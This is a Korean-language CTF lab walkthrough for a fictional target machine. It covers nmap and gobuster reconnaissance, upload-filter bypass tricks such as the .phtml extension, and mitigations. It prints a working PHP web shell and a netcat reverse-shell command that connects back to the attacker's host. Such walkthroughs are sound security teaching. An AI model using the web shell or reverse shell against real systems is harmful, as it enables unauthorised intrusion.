# VulnABLE CTF: Flag 1 획득 시나리오 (Initial Access)

안녕하세요! 모의해킹의 세계에 오신 것을 환영합니다. 이 문서는 `VulnABLE`이라는 가상의 타겟 머신(IP: `10.10.10.10`)을 해킹하여 첫 번째 플래그를 획득하는 과정을 **매우 상세하게** 기록한 가이드입니다. 

마치 현업 모의해커가 된 것처럼, 어떤 사고 과정을 거쳐 도구를 선택했고, 왜 그런 명령어를 입력했는지 시간순으로 낱낱이 파헤쳐보겠습니다.

---

## 🕒 1. 정보 수집 (Information Gathering)
모든 해킹의 시작은 "정찰"입니다. 적을 알아야 공격할 수 있겠죠? 가장 먼저 타겟 머신에서 어떤 서비스(포트)가 열려있는지 확인해야 합니다.

### 💡 사용 도구: Nmap
네트워크 스캐너인 `nmap`을 사용하여 포트 스캐닝을 진행했습니다.

```bash
# Nmap 스캔 명령어 실행
$ nmap -sC -sV -p- -T4 10.10.10.10
```

**[명령어 설명]**
* `-sC`: 기본(Default) Nmap 스크립트를 사용하여 취약점이나 서비스의 세부 정보를 파악합니다.
* `-sV`: 포트에서 동작 중인 서비스의 버전(Version) 정보를 알아냅니다. (버전을 알면 해당 버전의 취약점을 찾을 수 있습니다!)
* `-p-`: 1번부터 65535번까지 모든 포트를 검사합니다. (기본 1000개만 하면 숨겨진 포트를 놓칠 수 있어요.)
* `-T4`: 스캔 속도를 빠르게 설정합니다.

### 🔍 스캔 결과 분석
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to VulnABLE!
```

**[사고 과정]**
* 포트 `22 (SSH)`: 원격 접속 포트입니다. 당장은 비밀번호나 SSH 키가 없으니 억지로 뚫기(Brute-force)보다는 보류합니다.
* 포트 `80 (HTTP)`: 웹 서버가 열려있네요! 보통 가장 취약점이 많이 발견되는 곳이 바로 웹 애플리케이션입니다. 브라우저를 열고 `http://10.10.10.10`으로 접속해보기로 판단합니다.

## 🕒 2. 웹 서비스 탐색 (Web Enumeration)
브라우저로 접속해보니 단순한 정적 페이지("Welcome to VulnABLE!")만 보였습니다. 눈에 보이는 링크가 없으므로, 숨겨진 디렉터리나 파일이 있는지 찾아야 합니다.

### 💡 사용 도구: Gobuster
디렉터리 브루트포싱 도구인 `gobuster`를 사용했습니다.

```bash
# Gobuster 실행
$ gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**[명령어 설명]**
* `dir`: 디렉터리 및 파일 탐색 모드입니다.
* `-u`: 타겟 URL을 지정합니다.
* `-w`: 사용할 사전 파일(Wordlist)의 경로입니다. 해커들이 미리 모아둔 흔한 디렉터리 이름 목록을 대입해봅니다.
* `-x php,txt`: 확장자가 `.php`이거나 `.txt`인 파일도 함께 찾으라는 옵션입니다.

### 🔍 탐색 결과
```text
/index.php (Status: 200)
/assets (Status: 301)
/upload.php (Status: 200)  <-- 빙고!
```

**[사고 과정]**
`/upload.php`라는 흥미로운 페이지를 발견했습니다. 브라우저로 접속해보니 파일을 업로드할 수 있는 입력 폼(Form)이 나옵니다. 여기서 **파일 업로드 취약점**을 노려볼 수 있겠다는 확신이 들었습니다.

## 🕒 3. 취약점 식별 및 공격 준비 (Exploitation)

### 🚨 공격 원리: 악의적인 파일 업로드 (Unrestricted File Upload)
웹 서버는 클라이언트(사용자)가 업로드한 파일을 저장하고, 원할 때 다시 보여주는 기능을 제공합니다. 
하지만 개발자가 **"업로드되는 파일의 확장자나 내용을 제대로 검사하지 않으면"** 해커는 이미지 파일(`.jpg`) 대신 서버에서 실행 가능한 스크립트 파일(`.php`)을 업로드할 수 있습니다. 

서버는 이 PHP 파일을 단순한 문서로 보지 않고 **명령어로 인식하여 실행**해버립니다. 이것이 파일 업로드 취약점을 통한 **RCE(Remote Code Execution, 원격 코드 실행)**의 원리입니다! 주로 검증 로직이 부실한 게시판이나 프로필 사진 업로드 기능에서 발생합니다.

### 💡 리버스 셸 (Reverse Shell) 만들기
해커의 최종 목적은 서버의 터미널(명령창)을 내 컴퓨터로 가져오는 것입니다. 이를 위해 "웹셸" 코드를 작성합니다.

```php
<!-- 파일명: shell.php -->
<?php
// PHP의 내장 함수를 이용해 시스템 명령어를 실행하는 간단한 셸
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

## 🕒 4. 방어 로직 우회 및 공격 수행

### 첫 번째 시도
`shell.php` 파일을 그냥 업로드해 보았습니다.
**결과:** `에러: JPG, PNG 파일만 업로드 가능합니다!` 라는 메시지와 함께 실패.

### 💡 공격 기술: 확장자 우회 기법
개발자가 단순히 파일 이름의 끝부분만 검사한다면 우회할 수 있습니다. 저는 프록시 도구(Burp Suite)를 사용하여 패킷을 가로채고, 파일 이름을 교묘하게 바꾸어 보았습니다.

**[시도한 우회 방법들]**
1. 대소문자 혼용: `shell.PhP` 
2. 대체 확장자: `shell.php5`, `shell.phtml`
3. 이중 확장자: `shell.jpg.php`

테스트 결과, **`shell.phtml`** 확장자가 필터링을 통과하고 업로드에 성공했습니다! (서버의 정규표현식이 `.php`만 필터링하도록 잘못 짜여 있었던 것입니다.)

### 🔗 리버스 셸 연결
이제 내 컴퓨터(해커의 컴퓨터, IP: `10.10.10.99`)에서 포트를 열고 기다립니다.

```bash
# 내 컴퓨터에서 4444 포트를 열고 수신 대기 (Netcat 사용)
$ nc -lnvp 4444
```

이제 웹 브라우저를 열고 업로드된 파일이 위치한 경로에 접근하여, 서버가 내 컴퓨터로 터미널을 연결하도록 명령어를 보냅니다.
URL: `http://10.10.10.10/uploads/shell.phtml?cmd=nc -e /bin/bash 10.10.10.99 4444`

**[명령어 설명]**
`nc -e /bin/bash 10.10.10.99 4444` : 서버의 `/bin/bash`(터미널)을 해커의 컴퓨터 4444 포트로 연결(Export)하라는 뜻입니다.

## 🕒 5. 첫 번째 플래그 획득! 🚩

Netcat 화면에 드디어 무언가 떴습니다!

```bash
$ nc -lnvp 4444
Connection from 10.10.10.10:39842
whoami
www-data
```
서버에 성공적으로 침투했습니다! 현재 권한은 웹 서버를 구동하는 기본 계정인 `www-data`입니다.
플래그가 어디 있는지 찾아봅시다.

```bash
ls -la /var/www/
# 응답: flag1.txt 발견!

cat /var/www/flag1.txt
# 출력: THM{w3b_3xpl0it_m4st3r_101}
```

첫 번째 플래그 획득 완료입니다! 🎉

## 🛡️ 방어 대책 (Mitigation)
초보 모의해커라면 공격뿐만 아니라 "어떻게 막아야 하는가?"도 알아야 합니다.
이러한 파일 업로드 취약점을 막으려면:
1. **화이트리스트(Whitelist) 검증**: 허용할 확장자(jpg, png 등)만 명확히 지정하고 나머지는 모두 거부해야 합니다.
2. **MIME 타입 검사**: 파일의 확장자뿐만 아니라 실제 파일 내용의 시그니처(Magic Number)를 검사해야 합니다.
3. **업로드 디렉터리 실행 권한 제거**: 업로드된 폴더에서는 PHP 스크립트 등이 아예 실행되지 못하도록 웹 서버(Apache/Nginx) 설정을 제한해야 합니다.
4. **파일명 랜덤화**: 업로드 시 파일 이름을 무작위 문자열로 변경하여 공격자가 접근 경로를 유추하기 힘들게 만듭니다.

다음 시간에는 획득한 `www-data` 권한을 넘어서 일반 유저 계정(User)으로 권한을 상승시키는 두 번째 플래그 획득 시나리오를 다루어 보겠습니다!
